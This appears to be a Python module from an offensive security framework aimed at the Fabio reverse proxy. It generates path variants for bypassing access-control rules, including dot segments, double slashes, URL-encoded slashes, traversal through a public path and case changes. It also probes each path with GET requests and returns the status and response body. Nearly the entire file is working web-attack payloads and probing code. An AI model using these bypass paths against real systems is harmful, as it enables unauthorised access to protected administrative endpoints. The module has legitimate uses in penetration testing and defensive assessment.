#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fabio reverse-proxy ACL bypass path helpers."""

from __future__ import annotations

from typing import List, Optional, Tuple

from core.framework.base_module import BaseModule


class Fabio(BaseModule):
    @staticmethod
    def fabio_bypass_paths(protected: str) -> List[str]:
        p = str(protected or "/admin").lstrip("/")
        return [
            f"/./{p}",
            f"//{p}",
            f"/%2e/{p}",
            f"/public/..%2f{p}",
            f"/public/../{p}",
            f"/{p}/.",
            f"/{p}%2f..%2f{p}",
            f"/{p.upper()}",
        ]

    def fabio_probe_path(self, path: str) -> Tuple[int, str]:
        api = path if path.startswith("/") else f"/{path}"
        resp = self.http_request(method="GET", path=api, allow_redirects=False)
        if not resp:
            return 0, ""
        return int(resp.status_code or 0), (resp.text or "")[:2000]